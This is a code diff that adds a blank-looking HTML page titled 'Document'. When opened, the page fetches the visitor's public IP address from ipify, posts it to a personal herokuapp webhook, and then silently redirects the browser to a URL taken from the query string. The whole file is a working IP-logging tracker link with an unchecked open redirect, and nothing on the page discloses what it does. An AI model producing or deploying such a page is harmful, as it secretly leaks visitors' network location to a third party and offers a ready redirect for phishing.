@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  </head>
+  <body>
+    <script type="application/javascript">
+      async function getIP(json) {
+        await getMe(json);
+      }
+      async function getMe(json) {
+        await axios.get(`https://personal-webhook.herokuapp.com/get?ip=${json.ip}`);
+        window.location.replace(queryTaker());
+      }
+      function queryTaker() {
+        let raw = window.location.search;
+        raw = raw.split("=");
+        return raw[raw.length - 1];
+      }
+    </script>
+
+    <script
+      type="application/javascript"
+      src="https://api.ipify.org?format=jsonp&callback=getIP"
+    ></script>
+  </body>
+</html>
